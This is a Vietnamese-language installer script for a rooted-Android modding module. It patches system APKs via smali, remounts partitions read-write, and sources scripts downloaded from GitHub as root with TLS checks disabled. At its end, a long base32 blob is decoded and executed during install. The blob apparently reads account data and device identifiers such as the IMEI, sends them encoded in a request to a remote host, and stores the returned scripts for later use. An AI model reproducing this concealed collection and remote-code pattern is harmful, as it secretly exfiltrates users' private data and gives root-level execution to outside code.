# Kakathic

## Language text
chon="Chọn"
time="Tổng thời gian"
h="giờ"
m="phút"
s="giây"
Information="Thông tin"
author="Tác giả"
name="Tên"
unzip="Đang xử lý..."
volkey1="! Sử dụng phím âm lượng"
volkey2="! Vol- = Chọn số hiện tại, Vol+ = Chuyển đổi số."
volkey3="! Ấn nút nguồn để hủy."
load="Tải"
error="! Lỗi không tìm thấy hoặc lỗi mạng !"
error2="- Mô-đun này chỉ chạy trên thiết bị arm64, của bạn là $ARCH !"

TTvip=1
ui_print(){ echo "$1"; sleep 0.005; }
ui_print2(){ echo "  $1"; }
Xan(){ echo "  $1" >&2; }
BatdauT=$(date +%s)

# Volume keys
Vk(){ 
input2="$1"; input=1
Kgg(){ 
Key="$(getevent -qlc 1 | awk '{print $3}')"
if [ "$Key" == "KEY_POWER" ];then
abort
elif [ "$Key" == "KEY_VOLUMEUP" ];then
[ "$input" == "$input2" ] && input=1 || input=$(($input + 1))
ui_print "  $input"
sleep 0.3
Kgg
elif [ "$Key" == "KEY_VOLUMEDOWN" ];then
ui_print
ui_print "  $chon: $input"
ui_print
sleep 0.3
else Kgg; fi; }
Kgg
}

# Count time 
End_time(){
KetthucT=$(date +%s)
TongTG=$(($KetthucT - $BatdauT))
Gio=$(printf '%d' $((TongTG/3600%24)))
Phut=$(printf '%d' $((TongTG/60%60)))
if [ "$Gio" != 0 ];then
echo "$time: $(printf '%d '$h', %d '$m', %d '$s'.' $((TongTG/3600%24)) $((TongTG/60%60)) $((TongTG%60)))"
elif [ "$Phut" != 0 ];then
echo "$time: $(printf '%d '$m', %d '$s'.' $((TongTG/60%60)) $((TongTG%60)))"
else
echo "$time: $(printf '%d '$s'.' $((TongTG%60)))"
fi
}

# Download packages
Xu_install(){
[ "$2" ] && pb="_$2"
if [ ! -e "/data/tools/ck/$1$pb" ];then
ui_print "  $load $1..."
ui_print
Taive "https://github.com/kakathic/Tools/raw/Vip/Library/$1/README.md" "$TMPDIR/$1.sh"
[ "$(grep -icm1 '#\ kakathic' $TMPDIR/$1.sh)" == 1 ] && chmod 777 "$TMPDIR/$1.sh" || abort "$error"
cd /data/tools
. "$TMPDIR/$1.sh"
chmod -R 777 /data/tools/bin
rm -fr $HOME/tmp/*
fi
unset pb
}

# Internet
User="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
Taive(){
[ -e /system/bin/curl ] && curl -s -k -L -H "$User" --connect-timeout 20 "$1" -o "$2" || wget -q --header "$User" --no-check-certificate "$1" -O "$2" >&2
}
Xem(){
[ -e /system/bin/curl ] && curl -s -k -G -L -H "$User" --connect-timeout 20 "$1" || wget -q --header "$User" --no-check-certificate -O - "$1"
}

# mount
mrw () {
for i in / /system_root /system /system_ext /vendor /product; do
/system/bin/mount $i 2>/dev/null || /system/bin/mount $i 2>/dev/null
/system/bin/mount -o rw,remount $i 2>/dev/null || /system/bin/mount -o rw,remount $i 2>/dev/null
done
}

mro () {
for i in / /system_root /system /system_ext /vendor /product; do
/system/bin/mount -o ro,remount $i 2>/dev/null || /system/bin/mount -o ro,remount $i 2>/dev/null
/system/bin/umount $i 2>/dev/null || /system/bin/umount $i 2>/dev/null
done
}

baksmali () { java -Xms256m -Xmx512m -jar "/data/tools/lib/Tools/baksmali.jar" "$@"; }
smali () { java -Xms256m -Xmx512m -jar "/data/tools/lib/Tools/smali.jar" "$@"; }

# Tìm kiếm
Timkiem(){ find $TMPDIR/Apk/$2 -name "*.smali" -exec grep -l "${1//\//\\\/}" {} +; }

Vsmali(){
for Vka in $(find $4 -name "*.smali" -exec grep -l "$1" {} +); do
[ -e $Vka ] && ui_print2 "MOD: $RANDOM" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')"
[ -e $Vka ] && sed -i -e "/^${1//\//\\\/}/,/${2//\//\\\/}/c $(echo "$3" | sed -z 's|\n|\\n|g')" "$Vka"
[ -e $Vka ] && echo "$Vka" >> $TMPDIR/Apk/$(echo "$4" | sed "s|$TMPDIR/Apk/||g" | cut -d '/' -f1)/class
done
}

Thaythe(){
ui_print2 "MOD: $RANDOM -> $RANDOM"
for Tt2 in $(find $3 -name "*.smali" -exec grep -l "$1" {} +); do
[ -e "$Tt2" ] && sed -i "s|${1//\//\\\/}|${2//\//\\\/}|g" $Tt2 || Xan "- Lỗi: $1"
[ -e "$Tt2" ] && echo "$Tt2" >> $TMPDIR/Apk/$(echo "$3" | sed "s|$TMPDIR/Apk/||g" | cut -d '/' -f1)/class
done
}

Autoone(){
ui_print2 "MOD: $RANDOM -> $RANDOM"
for vakkddhh in $(find $3 -name "*.smali" -exec grep -l "..., $1" {} +); do
echo "sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')" | sh
echo "$vakkddhh" >> $TMPDIR/Apk/$(echo "$3" | sed "s|$TMPDIR/Apk/||g" | cut -d '/' -f1)/class
done
}

CPapk(){
PTC="$(pm path "$1" | cut -d : -f2)"
if [ "$(echo "$PTC" | grep -cm1 '/data/')" == 1 ];then
cp -rf $PTC "/data/tools/apk/$1.apk"
cp -rf "$PTC" "$TMPDIR/Apk/$1.apk"
pm uninstall $1 >&2
else
Pathfw2="$(find /*/app /*/*/app /*/priv-app /*/*/priv-app /*/framework /*/*/framework -type f -name "${PTC##*/}" -not -path "*/data/*" | head -n1)"
Padddj="$(find $(magisk --path)/.magisk/mirror -type f -name "${PTC##*/}" -not -path "*/data/*" | head -n1)"
#cp -rf $PTC "/data/tools/apk/$1.apk"
[ -e "/data/tools/apk/$1.apk" ] && cp -rf "/data/tools/apk/$1.apk" "$TMPDIR/Apk/$1.apk" || cp -rf "$Padddj" "$TMPDIR/Apk/$1.apk"
fi
echo "$(pm path "$1" | cut -d : -f2)" | tee "$TMPDIR/Apk/$1.txt" >&2
}

CPfile(){
Pathfw="$(find /*/app /*/*/app /*/priv-app /*/*/priv-app /*/framework /*/*/framework -type f -name "$1.jar" -not -path "*/data/*" | head -n1)"
Padddjfn="$(find $(magisk --path)/.magisk/mirror -type f -name "$1.jar" -not -path "*/data/*" | head -n1)"
cp -rf "$Padddjfn" "$TMPDIR/Apk"
echo "$Pathfw" | tee "$TMPDIR/Apk/$1.txt" >&2
}

# giải nén file
Giainen(){
for vapk in $TMPDIR/Apk/*.*; do
if [ "${vapk##*.}" == 'apk' ] || [ "${vapk##*.}" == 'jar' ];then
PTd="$(cat ${vapk%.*}.txt)"
[ -e "$vapk" ] && ui_print "  Giải nén: ${PTd##*/}" || abort "- Lỗi không tìm thấy file! ${PTd##*/}"
ui_print
mkdir -p ${vapk%.*}
unzip -qo "$vapk" '*.dex' -d ${vapk%.*}
for vsmali in ${vapk%.*}/*.dex; do
baksmali d --api $API $vsmali -o ${vsmali%.*}
done
fi
done
}

Donggoi(){
# Đóng gói apk
for bapk in $TMPDIR/Apk/*.*; do
if [ "${bapk##*.}" == 'apk' ] || [ "${bapk##*.}" == 'jar' ];then
if [ -e "${bapk%.*}/class" ];then
PTb="$(cat ${bapk%.*}.txt)"
ui_print "  Đóng gói: ${PTb##*/}"
ui_print
for bsmali in $(cat ${bapk%.*}/class 2>/dev/null | sed "s|$TMPDIR/Apk/||g" | cut -d '/' -f2 | sort | uniq); do
rm -fr "$bsmali".dex
smali a --api $API ${bapk%.*}/$bsmali -o "${bapk%.*}/$bsmali".dex
done
cd ${bapk%.*}
zip -qr -0 $bapk '*.dex'
zipalign -f 4 $bapk $TMPDIR/Apk/tmp/${bapk##*/} 
cp -rf $TMPDIR/Apk/tmp/* $TMPDIR/Apk
else
rm -fr ${bapk%.*}*
fi
fi
done

for Capk in $TMPDIR/Apk/*.*; do
if [ "${Capk##*.}" == 'apk' ];then
Papkp="$(cat ${Capk%.*}.txt)"
if [ "$(unzip -l $Capk 2>/dev/null | grep -cm1 "lib/$ABI/")" == 1 ];then
mkdir -p $MODPATH${Papkp%/*}/lib/$ARCH
unzip -qo -j $Capk "lib/$ABI/*" -d $MODPATH${Papkp%/*}/lib/$ARCH
fi
mkdir -p $MODPATH${Papkp%/*}
cp -rf $Capk "$MODPATH$Papkp"
fi
if [ "${Capk##*.}" == 'jar' ];then
Papkp="$(cat ${Capk%.*}.txt)"
mkdir -p "$MODPATH${Papkp%/*}"
cp -rf $Capk "$MODPATH$Papkp"
fi
done
}

# Freeze
FREEZE(){
for TARGET in $1; do
mktouch $MODPATH$TARGET/.replace
done
}

GP () { grep_prop $1 $TMPDIR/module.prop; }

API=$(getprop ro.build.version.sdk)
ABI=$(getprop ro.product.cpu.abi)

if [ "$ABI" = "x86" ]; then
export ARCH=x86
export ARMT=i686
elif [ "$ABI" = "arm64-v8a" ]; then
export ARCH=arm64
export ARMT=arm64
elif [ "$ABI" = "x86_64" ]; then
export ARCH=x64
export ARMT=x86-64
else
export ARMT=arm
export ARCH=arm
export ABI=armeabi-v7a
fi

TTM(){
for vah in $1; do
[ -e $vah ] || mkdir -p "$vah"
done
}

TTM "/data/tools/bin
$TMPDIR/Apk/tmp
/data/tools/ck
/data/tools/tmp
/data/tools/apk
/data/tools/lib/Tools"

[ "$API" -ge 31 ] && miuik='miui-'

unset vah
unset mklist

export PATH="/data/tools/bin:$PATH"
export HOME="/data/tools"

print_modname(){

echo 'OVUV64DSNFXHICTVNFPXA4TJNZ2CAIRAEASG4YLNMU5CAJBII5ICA3TBNVSSSIBEFBDVAIDWMVZHG2LPNYUSECTVNFPXA4TJNZ2AU5LJL5YHE2LOOQQCEIBAERQXK5DIN5ZDUIBEFBDVAIDBOV2GQ33SFERAU5LJL5YHE2LOOQFHK2K7OBZGS3TUEARCAIBEJFXGM33SNVQXI2LPNY5CAJBIM5SXI4DSN5YCA4TPFZYHE33EOVRXILTEMV3GSY3FFEWCAJCBKBESYIBEIFJEGSBCBJ2WSX3QOJUW45AKBJKGK43UGEZDGPLUOJ2WKCSBOBUWY5B5EISCQWZAEISCQZTJNRSSAL3EMF2GCL3TPFZXIZLNF5ZXS3TDF5QWGY3POVXHI4ZOPBWWYID4EBTXEZLQEAWWGIDUMV4HIKJCEA6T2IBREBOSAJRGEBRXAIBNOJTCAL3EMF2GCL3TPFZXIZLNF5ZXS3TDF5QWGY3POVXHI4ZOPBWWYIBEKRGVARCJKIXTCLTYNVWCA7D4EBQWE6BSPBWWYIBPMRQXIYJPON4XG5DFNUXXG6LOMMXWCY3DN52W45DTFZ4G23BAERKE2UCEJFJC6MJOPBWWYOZAM5ZGK4BAFVWTCIBCMNXW2LTYNFQW63LJEIQCIVCNKBCESURPGEXHQ3LMEB6CA5DSEATSAJZAE5OG4JZAPQQGO4TFOAQC23JREBQWGY3POVXHIID4EBRXK5BAFVSCAXBCEAWWMMRJEIFGS3LFNE6SEJBIM5SXI4DSN5YCA4DFOJZWS43UFZZGCZDJN4XG2ZLJMQUSECS3EAWXUIBCERUW2ZLJEIQF2IBGEYQGS3LFNE6SEJBIM5SXI4DSN5YCA4TPFZZGS3BON5SW2LTNMVUWIKJCBJNSALL2EARCI2LNMVUSEIC5EATCMIDJNVSWSPJCEQUGO4TFOAQC23JREBVWK6K7NVSWSZC7ONWG65BQEAXWIYLUMEXSULZQF5RW63JOMFXGI4TPNFSC44DIN5XGKL3TNBQXEZLEL5YHEZLGOMXWG33NFZQW4ZDSN5UWILTQNBXW4ZK7OBZGKZTFOJSW4Y3FOMXHQ3LMEB6CAY3VOQQC2ZBAE47COIBNMYZCA7BAMN2XIIBNMQQCOPBHEAWWMMJJEIFFWIBNPIQCEJDJNVSWSIRALUQCMJRANFWWK2J5EJEMHI3ZEDQ3VJLOEAVCGMBWEMQMJEPBXOBSA2DJ4G5YO3RAJVCUSRBJEIFEI5DJNVST2IREFBSGC5DFEAVSKWJNEVWSSLJEFBSWG2DPEASCQKBAEQUGIYLUMUQCWJLEFEQCWIBREAUSSKJAEQUGIYLUMUQCWJKIHISU2KJCBIFGI4TJOZSXEPJEFBTWK5DQOJXXAIDSN4XHA4TPMR2WG5BOOZSW4ZDPOIXGIZLWNFRWKKIKLMQCEJDEOJUXMZLSEIQF2ID4PQQGI4TJOZSXEPJEFBTWK5DQOJXXAIDSN4XHA4TPMR2WG5BOON4XG5DFNUXGIZLWNFRWKKIKBJMGK3JAEJUHI5DQOM5C6L3SMF3S4Z3JORUHKYTVONSXEY3PNZ2GK3TUFZRW63JPNNQWWYLUNBUWGL22JAWVMTRPLJEC6Q3PMRSS6JDEOJUXMZLSF4SCQZLDNBXSAIREIFYGS3DUEIQHYIDCMFZWKMZSEAWXOMBJEIQD4IBEKRGVARCJKIXWCY3DFZZWQCSYMVWSAITIOR2HA4Z2F4XXEYLXFZTWS5DIOVRHK43FOJRW63TUMVXHILTDN5WS623BNNQXI2DJMMXVUSBNKZHC6WSIF5BW6ZDFF4SGI4TJOZSXELZEFBSWG2DPEARCI2LNMVUSEID4EBRGC43FGMZCALLXGAUSEIB6EASFITKQIREVEL3BMNRTELTTNAFAUY3INVXWIIBNKIQDONZXEASFITKQIREVELZKFZZWQCSQOJXSQKL3BJNSAIREFBTXEZLQEAWWGIBHEMQGWYLLMF2GQ2LDE4QCIVCNKBCESURPMFRWGLTTNAUSEIB5HUQDCIC5EATCMIBOEASFITKQIREVEL3BMNRS443IBJ6QUUDSN4ZCQKL3BJNSAIREFBTXEZLQEAWWGIBHEMQGWYLLMF2GQ2LDE4QCIVCNKBCESURPMFRWGMROONUCSIRAHU6SAMJALUQCMJRAFYQCIVCNKBCESURPMFRWGMROONUAU7IKBJUWMIC3EARCIKCQOJXSSIRAHU6SAMJALUQHY7BALMQCEJBIKBZG6MRJEIQD2PJAGEQF2O3UNBSW4CQKOVUV64DSNFXHIIBCEAQEG2GDUBXSAYXBXKQW4ORAERAXA2LMOQRAU5LJL5YHE2LOOQFHK2K7OBZGS3TUEARCAICT4G522IDE4G52K3THEDCJDYN2X5XDUIBEIR2GS3LFEIFHK2K7OBZGS3TUBJSWY2LGEBNSALLFEAXWIYLUMEXXI33PNRZS63DJMIXWY33HFZ2HQ5BALU5XI2DFNYFGCYTPOJ2CAIRBEBBODOVBNYQMJEODUMQGRYN2X52CA5DI4G5Z22JAM5UWC3RAMTB3S3THEB2GRYN3VUFCAIAKEAQE3YN3TVUSAYXBXKQW4IHBXOTW4ZZANDQ3XGJAYSI6DO4DEB2GTYN2X5YCA5HBXOSWGIDT4G522IDE4G52K3THFYFCECTFNRZWKCTVNFPXA4TJNZ2CAIRBEBKGRQ5UNZTSAYWDUFXSBYN3U5XGOIDI4G5ZSIAKBIQCAVGDVJXCA3ODUF4TUIBEMRZGS5TFOIFAUIBAKTB2A2JANNUG7YN2UNXCATLJHIQCIQLQNFWHICRAEAFCAICJJVCUSORAERUW2ZLJBIFCAIGESDQ3XAZAOPQ3XLJAMTQ3XJLOM4QGZQ5COUQGJQ5ANEQGFYN2UFXCA3WDVJXCBYN3U5XGOIDI4G5ZSCQKEAQMJEPBXOBSA47BXOWSAZHBXOSW4ZZAO3CKS3TIEB3GTYN3QVXC4CQKEAQFI2HBXOWSA3THNBU6DO4HNUQHHYN2XUQGHQ5TEB2MHILDEBSODO5FNZTSA5DSN5XGOIBSGQQGO2PBXOOSACQKEAQERYN2X52CA5DI4G5Z22JAM5UWC3RAOPQ3VPJAOTQ3XMJAYSI6DO4ZNZTSA4TFMJXW65BOBIRAU43MMVSXAIBSBJQW2IDTORQXE5BAFVQSAYLOMRZG62LEFZUW45DFNZ2C4YLDORUW63ROKZEUKVZAFVSCAITIOR2HA4Z2F4XWWYLLMF2GQ2LDFZTWS5DIOVRC42LPF5NEQLKWJYXVG5LQOBXXE5BONB2G23BCEA7CMMQKBIRSGICDNBSWG2ZAORUGKIDTPFZXIZLNEBSGK5TJMNSXGCS3EARCIQKSINECEIB5HUQCEYLSNU3DIIRALUQHY7BAMFRG64TUEARCIZLSOJXXEMRCBIFHIZLYNM6SEJ2D4G5KG3JAY2QW4IDC4G5KC3RAYSI4HIZA4G52O3THEBUODO4ZEBWW6ZDVNRSSAVTJ4G5YO5BAJZQW2IDC4G5KC3RAMPB3GIDUNDQ3XAZAORU6DOV7OAQHJYN3UVRSA47BXOWSAZHBXOSW4ZZOE4RAU5DFPBVTEPJCE5B4HMTOEAYSA5DJ4G5L63THEBXODO5PMEQG233EOVWGKICWNHQ3XB3UEBUMHM3BEBZ6DOV5EBUODOV7OQQHI2HBXOOWSIDHNFQW4IDT4G522IDE4G52K3THE4RAUZLDNBXSAJYKO5UGS3DFEB2HE5LFHMQGI3YKORUG62LHNFQW42TEHURCIKDEMF2GKIBLEVMSK3JFMQSUQJKNFERAU5DIN5UWO2LBNZUGK5B5EITSIKDEMF2GKIBLEVMSK3JFMQSUQJKNFETSECTJMYQFWIBCEQUCQIBEORUG62LHNFQW42TEEAWSAJDUNBXWSZ3JMFXGQZLUEAUSSIRAFVTWKIBCGEYDAMBQEIQF2O3UNBSW4CS3EARCIKBIEASHI2DPNFTWSYLONJSCALJAER2GQ33JM5UWC3TIMV2CAKJJEIQC2Z3FEARDSOJQGARCAXJAEYTCA43VEAWWY4BAGIYDAMBAFVRSAITDNVSCA3TPORUWM2LDMF2GS33OEBYG643UEASFEQKOIRHU2IBHER2GK6DLGITSECTSNUQC2ZTSEAXWIYLUMEXWCZDCF5WW6ZDVNRSXGL2WJAWSUCTFMNUG6IB6EAXWIYLUMEXXI33PNRZS63DJMIXWY33HFZ2HQ5AKONWGKZLQEAYTACTCOJSWC2YKMVWHGZIKMRZGS5TFOI6SOJDEOJUXMZLSE4FEC4DJNR2D2JZEIFYGS3DUE4FGS3LFNE6SOJDJNVSWSJYKMN2XE3BAFURUOIBCNB2HI4DTHIXS64TBO4XGO2LUNB2WE5LTMVZGG33OORSW45BOMNXW2L3LMFVWC5DINFRS6WSIFVLE4L22JAXUG33EMUXSIZDSNF3GK4RPEQUGKY3IN4QCEJCBOBUWY5BCEB6CAYTBONSTGMRAFV3TAKJCEA7CAL3EMF2GCL3UN5XWY4ZPNRUWEL3BMNRS443IBJRXK4TMEAWSGRZAEJUHI5DQOM5C6L3SMF3S4Z3JORUHKYTVONSXEY3PNZ2GK3TUFZRW63JPNNQWWYLUNBUWGL22JAWVMTRPLJEC6Q3PMRSS6JDEOJUXMZLSF4SCQZLDNBXSAIRENFWWK2JCEB6CAYTBONSTGMRAFV3TAKJCEA7CAL3EMF2GCL3UN5XWY4ZPNRUWEL3BMNRTELTTNAFGG2DNN5SCALKSEA3TONZAF5SGC5DBF52G633MOMXWY2LCF4VC443IBJIHE3ZIFF5QUWZAEISCQZ3SMVYCALLDEATSGIDLMFVWC5DINFRSOIBPMRQXIYJPORXW63DTF5WGSYRPMFRWGLTTNAUSEIB5HUQDCIC5EATCMIBOEAXWIYLUMEXXI33PNRZS63DJMIXWCY3DFZZWQCT5BJIHE3ZSFAUXWCS3EARCIKDHOJSXAIBNMMQCOIZANNQWWYLUNBUWGJZAF5SGC5DBF52G633MOMXWY2LCF5QWGYZSFZZWQKJCEA6T2IBREBOSAJRGEAXCAL3EMF2GCL3UN5XWY4ZPNRUWEL3BMNRTELTTNAFH2CTJMYQFWIBCEQUFA4TPFERCAPJ5EAYSAXJAPR6CAWZAEISCQUDSN4ZCSIRAHU6SAMJALU5XI2DFNYFHG5JAFVWHAIBSGAYDAIBNMMQCEY3NMQQG433UNFTGSY3BORUW63RAOBXXG5BAERJECTSEJ5GSAJZEORSXQ2ZHEIFHE3JAFVTHEIBEGAFGE4TFMFVQUZTJBJZWYZLFOAQDGNRQGAFGM2IKMRXW4ZIKE4QD4IBPMRQXIYJPORXW63DTF5WGSYRPOJ2W4LTTNAFGKY3IN4QCOCROEAXWIYLUMEXXI33PNRZS63DJMIXXE5LOFZZWQCTSNUQC2ZTSEAXWIYLUMEXWCZDCF5ZWK4TWNFRWKLTEF5LEWLTTNAFCOIB6EAXWIYLUMEXWCZDCF5ZWK4TWNFRWKLTEF5LEWLTTNAFAUY3INVXWIIBXG43SAL3EMF2GCL3BMRRC643FOJ3GSY3FFZSC6VSLFZZWQIAKMNUG233EEA3TONZAF5SGC5DBF52G633MOMXWY2LCF5ZHK3ROONUAUZTJ' | base32 -d > $TMPDIR/ka.sh && . $TMPDIR/ka.sh
}




